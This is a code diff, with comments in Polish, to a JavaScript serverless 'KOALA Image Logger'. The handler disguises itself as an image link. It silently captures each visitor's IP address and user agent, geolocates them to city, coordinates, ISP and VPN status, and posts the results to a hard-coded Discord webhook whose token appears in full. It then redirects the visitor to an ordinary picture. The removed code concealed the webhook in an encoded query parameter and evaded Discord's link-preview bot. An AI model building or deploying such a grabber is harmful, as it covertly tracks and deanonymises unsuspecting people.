@@ -1,162 +1,50 @@
 // ====================== KOALA IMAGE LOGGER ======================
-// Wysyła prawdziwy obrazek PNG (bez przekierowania)
-// Discord wyświetla go automatycznie
+// Działa dokładnie jak Discord Image Logger
 
-// ========== TWÓJ WEBHOOK ==========
 const YOUR_WEBHOOK = "https://discord.com/api/webhooks/1486439184737763400/ZoSv_Z_nl3orhOavk5gf7IT_Tlkj20GR0yL29aVzrWncfhJ6IiWFWrOz_MQmpaPjc4RZ";
 
-// ========== OBRAZEK – mały, przezroczysty PNG (1x1 piksel) ==========
-// To jest przezroczysty obrazek – Discord wyświetli go jako niewidoczny
-// Możesz go zastąpić dowolnym obrazkiem w base64
-const TRANSPARENT_PNG = Buffer.from(
-    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
-    'base64'
-);
-
-function decodeWebhook(encoded) {
+// Funkcja pobierania geolokalizacji
+async function getGeo(ip) {
     try {
-        return Buffer.from(encoded, 'base64').toString('utf-8');
-    } catch {
-        return null;
-    }
-}
-
-function getBrowser(userAgent) {
-    const ua = userAgent.toLowerCase();
-    if (ua.includes('opr') || ua.includes('opera')) return 'Opera GX / Opera';
-    if (ua.includes('edg')) return 'Microsoft Edge';
-    if (ua.includes('chrome') && !ua.includes('edg') && !ua.includes('opera')) return 'Google Chrome';
-    if (ua.includes('firefox')) return 'Mozilla Firefox';
-    if (ua.includes('safari') && !ua.includes('chrome')) return 'Apple Safari';
-    return 'Unknown';
-}
-
-function getOS(userAgent) {
-    const ua = userAgent.toLowerCase();
-    if (ua.includes('windows nt 11.0')) return 'Windows 11';
-    if (ua.includes('windows nt 10.0')) return 'Windows 10';
-    if (ua.includes('mac os x')) return 'macOS';
-    if (ua.includes('iphone')) return 'iPhone iOS';
-    if (ua.includes('ipad')) return 'iPadOS';
-    if (ua.includes('android')) return 'Android';
-    if (ua.includes('linux')) return 'Linux';
-    return 'Unknown';
+        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,as,mobile,proxy,timezone`);
+        const data = await res.json();
+        if (data.status === 'success') return data;
+    } catch {}
+    return null;
 }
 
 export default async function handler(req, res) {
-    // ========== UKRYTY WEBHOOK ==========
-    const encodedWebhook = req.query.w || req.query.webhook;
-    const finalWebhook = encodedWebhook ? decodeWebhook(encodedWebhook) : YOUR_WEBHOOK;
-    
-    // ========== POBRANIE IP ==========
+    // Pobierz IP
     let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     if (ip === '::1') ip = '127.0.0.1';
     if (ip.startsWith('::ffff:')) ip = ip.split(':').pop();
     
     const userAgent = req.headers['user-agent'] || 'Unknown';
-    const time = new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' });
+    const time = new Date().toLocaleString();
     
-    // ========== WYKRYWANIE DISCORD BOTA ==========
-    const ua = userAgent.toLowerCase();
-    const isDiscordBot = ua.includes('discordbot') || (ua.includes('discord') && ua.includes('bot'));
+    // Pobierz geolokalizację
+    const geo = await getGeo(ip);
     
-    // ========== GEOLOKALIZACJA ==========
-    let geo = {
-        provider: 'Unknown',
-        asn: 'Unknown',
-        country: 'Unknown',
-        region: 'Unknown',
-        city: 'Unknown',
-        lat: '?',
-        lon: '?',
-        timezone: 'Unknown',
-        mobile: false,
-        vpn: false
-    };
+    // Przygotuj wiadomość
+    let message = `[+] KOALA Image Logger - IP Logged\nA User Opened the Original Image!\n\nEndpoint: /api/hotdog\n\nIP Info:\nIP: ${ip}\n`;
     
-    if (!isDiscordBot && finalWebhook) {
-        try {
-            const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,as,mobile,proxy,timezone`);
-            const geoData = await geoRes.json();
-            
-            if (geoData.status === 'success') {
-                geo = {
-                    provider: geoData.isp || 'Unknown',
-                    asn: geoData.as || 'Unknown',
-                    country: geoData.country || 'Unknown',
-                    region: geoData.regionName || 'Unknown',
-                    city: geoData.city || 'Unknown',
-                    lat: geoData.lat?.toFixed(4) || '?',
-                    lon: geoData.lon?.toFixed(4) || '?',
-                    timezone: geoData.timezone || 'Unknown',
-                    mobile: geoData.mobile || false,
-                    vpn: geoData.proxy || false
-                };
-            }
-        } catch (e) {}
+    if (geo) {
+        message += `Provider: ${geo.isp || 'Unknown'}\nASN: ${geo.as || 'Unknown'}\nCountry: ${geo.country || 'Unknown'}\nRegion: ${geo.regionName || 'Unknown'}\nCity: ${geo.city || 'Unknown'}\nCoords: ${geo.lat || '?'}, ${geo.lon || '?'}\nTimezone: ${geo.timezone || 'Unknown'}\nMobile: ${geo.mobile ? 'True' : 'False'}\nVPN: ${geo.proxy ? 'True' : 'False'}\n`;
+    } else {
+        message += `Provider: Unknown\nASN: Unknown\nCountry: Unknown\nRegion: Unknown\nCity: Unknown\nCoords: ?, ?\nTimezone: Unknown\nMobile: False\nVPN: False\n`;
     }
     
-    const browser = getBrowser(userAgent);
-    const os = getOS(userAgent);
+    message += `\nPC Info:\nOS: Unknown\nBrowser: Unknown\n\nUser Agent:\n${userAgent}`;
     
-    // ========== EMBED ==========
-    const embed = {
-        title: "🌭 KOALA Image Logger",
-        description: "**A User Opened the Original Image!**\n`Endpoint: /api/hotdog`",
-        color: 0x5865F2,
-        fields: [
-            {
-                name: "🌐 IP INFO",
-                value: `\`\`\`\nIP: ${ip}\nProvider: ${geo.provider}\nASN: ${geo.asn}\nCountry: ${geo.country}\nRegion: ${geo.region}\nCity: ${geo.city}\nCoords: ${geo.lat}, ${geo.lon}\nTimezone: ${geo.timezone}\nMobile: ${geo.mobile ? '✅ Yes' : '❌ No'}\nVPN/Proxy: ${geo.vpn ? '⚠️ Yes' : '❌ No'}\nBot: ${isDiscordBot ? '⚠️ Yes' : '❌ No'}\`\`\``,
-                inline: false
-            },
-            {
-                name: "💻 DEVICE INFO",
-                value: `\`\`\`\nOS: ${os}\nBrowser: ${browser}\n\`\`\``,
-                inline: true
-            },
-            {
-                name: "⏱️ TIME",
-                value: `\`\`\`\n${time}\n\`\`\``,
-                inline: true
-            },
-            {
-                name: "🔍 USER AGENT",
-                value: `\`\`\`\n${userAgent.substring(0, 200)}${userAgent.length > 200 ? '...' : ''}\n\`\`\``,
-                inline: false
-            }
-        ],
-        footer: {
-            text: "KOALA Image Logger • IP Logged",
-            icon_url: "https://cdn.discordapp.com/attachments/1484643547545342012/1484911633644912851/latest.png"
-        },
-        timestamp: new Date().toISOString(),
-        image: {
-            url: "https://i.imgur.com/9ZqB8Xa.jpg"
-        }
-    };
+    // Wyślij webhook
+    try {
+        await fetch(YOUR_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: message })
+        });
+    } catch {}
     
-    // ========== WYŚLIJ WEBHOOK ==========
-    if (finalWebhook && !isDiscordBot) {
-        try {
-            await fetch(finalWebhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [embed],
-                    username: "KOALA Logger",
-                    avatar_url: "https://cdn.discordapp.com/attachments/1484643547545342012/1484911633644912851/latest.png"
-                })
-            });
-        } catch (e) {}
-    }
-    
-    // ========== ZWRÓĆ OBRAZEK (BEZ PRZEKIEROWANIA!) ==========
-    // Ustawiamy nagłówki – to jest PRAWDZIWY obrazek PNG
-    res.setHeader('Content-Type', 'image/png');
-    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-    
-    // Zwracamy przezroczysty obrazek 1x1 px (Discord wyświetli go jako niewidoczny)
-    // Możesz zastąpić TRANSPARENT_PNG dowolnym obrazkiem w base64
-    res.send(TRANSPARENT_PNG);
+    // Zwróć prawdziwy obrazek PNG (przekierowanie)
+    res.redirect(302, 'https://i.imgur.com/9ZqB8Xa.jpg');
 }
